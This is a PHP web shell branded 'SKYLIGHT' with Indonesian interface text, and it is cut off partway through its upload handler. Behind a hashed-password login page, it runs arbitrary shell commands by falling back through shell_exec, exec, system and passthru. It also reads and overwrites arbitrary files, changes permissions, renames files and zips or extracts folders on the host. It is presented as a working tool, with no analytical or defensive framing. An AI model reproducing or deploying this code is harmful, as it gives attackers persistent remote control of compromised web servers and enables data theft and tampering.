<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

$USERNAME = 'SKYLIGHT';
$HASHED_PASSWORD = '$2a$12$2OuwFgz1DoRRMvKAe5gXGu0gHHqI9VEjXL9lyNrM7GclxdfiQ4l6.';

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['login'])) {
        if ($_POST['username'] === $USERNAME && password_verify($_POST['password'], $HASHED_PASSWORD)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah.";
        }
    }

    echo '<!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>Login - SKYLIGHT</title>
        <style>
            @import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
            body {
                background: radial-gradient(circle at center, #000000, #0f0f0f);
                color: rgba(255, 0, 0, 1);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: "Share Tech Mono", monospace;
            }
            .login-box {
                background: #111;
                border: 2px solid rgba(255, 0, 0, 1);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 0 20px rgba(255, 0, 0, 1);
                text-align: center;
                width: 300px;
            }
            .login-box img {
                max-width: 100px;
                border-radius: 50%;
                margin-bottom: 20px;
                box-shadow: 0 0 10px rgba(255, 0, 0, 1);
            }
            input, button {
                margin: 10px 0;
                padding: 10px;
                width: 100%;
                border: none;
                border-radius: 5px;
                background: #222;
                color: rgba(255, 0, 0, 1);
                font-size: 14px;
            }
            button {
                background: rgba(255, 0, 0, 1);
                color: #000;
                font-weight: bold;
                cursor: pointer;
            }
            h2 {
                margin-bottom: 10px;
            }
            .error {
                color: red;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <form method="POST" class="login-box">
            <img src="https://botstrap.cc/image/skylight.png" alt="SKYLIGHT">
            <h2>SKYLIGHT</h2>
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">MASUK</button>
            ' . (isset($error) ? "<div class='error'>$error</div>" : "") . '
        </form>
    </body>
    </html>';
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function x($string) {
    return htmlspecialchars($string ?? '', ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    else return $bytes . ' B';
}

function permColor($path) {
    if (is_writable($path)) return 'style="color:#0f0"';
    elseif (is_readable($path)) return 'style="color:#fff"';
    else return 'style="color:#f00"';
}

function runShellCommand($command) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $lines);
        $output = implode("\n", $lines);
    } elseif (function_exists('system')) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        $output = ob_get_clean();
    } else {
        return false;
    }
    return $output;
}

$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

$inputPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();

$currentPath = $isWindows
    ? str_replace('/', DIRECTORY_SEPARATOR, $inputPath)
    : str_replace('\\', DIRECTORY_SEPARATOR, $inputPath);

if (!is_dir($currentPath)) {
    die("Direktori tidak valid: <code>$currentPath</code>");
}

if (!is_dir($currentPath)) die("Direktori tidak valid.");

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'unzip' && !empty($_POST['zip_path'])) {
        $zipPath = $_POST['zip_path'];
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === true) {
            $zip->extractTo($currentPath);
            $zip->close();
            echo json_encode(['status' => 'success', 'message' => 'Berhasil extract file ZIP.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Gagal membuka file ZIP.']);
        }
        exit;
    }

    if ($_POST['action'] === 'zip' && !empty($_POST['folder_to_zip'])) {
        $folderToZip = $_POST['folder_to_zip'];
        $zipName = basename($folderToZip) . ".zip";
        $zipPath = $currentPath . DIRECTORY_SEPARATOR . $zipName;

        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            $folderRealPath = realpath($folderToZip);
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($folderRealPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($files as $file) {
                $filePath = realpath($file);
                $relativePath = substr($filePath, strlen($folderRealPath) + 1);
                if ($file->isDir()) {
                    $zip->addEmptyDir($relativePath);
                } else {
                    $zip->addFile($filePath, $relativePath);
                }
            }

            $zip->close();
            echo json_encode(['status' => 'success', 'message' => "Folder berhasil dijadikan ZIP: $zipName"]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Gagal membuat file ZIP.']);
        }
        exit;
    }
}

$allItems = scandir($currentPath);
$allFiles = [];
$allFolders = [];
foreach ($allItems as $item) {
    if ($item === '.' || $item === '..') continue;
    $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
    if (is_dir($itemPath)) $allFolders[] = $item;
    if (is_file($itemPath) && pathinfo($item, PATHINFO_EXTENSION) === 'zip') $allFiles[] = $item;
}

if (isset($_POST['run_command'])) {
    $command = $_POST['command'];
    $output = runShellCommand($command);
    if ($output !== false) {
        if (!empty($output)) {
            $message = "<pre style='background:#000;color:#0f0;padding:10px;'>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";
            $messageType = "success";
        } else {
            $message = "<div class='alert error'>Perintah tidak bisa dijalankan atau tidak menghasilkan output.</div>";
            $messageType = "error";
        }
    } else {
        $message = "Semua fungsi eksekusi shell tidak tersedia di server.";
        $messageType = "error";
    }
}

if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $newFile = rtrim($currentPath, '/') . '/' . basename($_POST['file_name']);
    if (file_exists($newFile)) {
        $message = "File sudah ada.";
        $messageType = "error";
    } else {
        if (file_put_contents($newFile, '') !== false) {
            $message = "File berhasil dibuat.";
            $messageType = "success";
        } else {
            $message = "Gagal membuat file.";
            $messageType = "error";
        }
    }
}

if (isset($_POST['edit'])) {
    $path = $_POST['edit_path'];
    if (is_file($path)) {
        $content = htmlspecialchars(file_get_contents($path));
        echo "<form method='POST' style='padding:20px;background:#222;color:#fff;'>
            <input type='hidden' name='edit_path' value='" . htmlspecialchars($path) . "'>
            <textarea name='new_content' style='width:100%;height:300px;background:#000;color:#0f0;'>$content</textarea><br>
            <button name='save_edit' style='padding:10px;background:#0f0;color:#000;'>Simpan</button>
        </form>";
        exit;
    }
}

if (isset($_POST['change_perm']) && !empty($_POST['perm_path']) && !empty($_POST['permissions'])) {
    $permPath = $_POST['perm_path'];
    $perm = $_POST['permissions'];

    if (@chmod($permPath, octdec($perm))) {
        $message = "Permission berhasil diubah.";
        $messageType = "success";
    } else {
        $message = "Gagal mengubah permission.";
        $messageType = "error";
    }
}

if (isset($_POST['rename']) && !empty($_POST['rename_path']) && !empty($_POST['new_name'])) {
    $oldPath = $_POST['rename_path'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (file_exists($newPath)) {
        $message = "Nama baru sudah digunakan.";
        $messageType = "error";
    } else {
        if (rename($oldPath, $newPath)) {
            $message = "Berhasil mengganti nama.";
            $messageType = "success";
        } else {
            $message = "Gagal mengganti nama.";
            $messageType = "error";
        }
    }
}

if (isset($_POST['save_edit'])) {
    if (file_put_contents($_POST['edit_path'], $_POST['new_content']) !== false) {
        $message = "File berhasil disimpan.";
        $messageType = "success";
    } else {
        $message = "Gagal menyimpan file.";
        $messageType = "error";
    }
}

if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
    $targetPath = rtrim($currentPath, '/') . '/' . basen
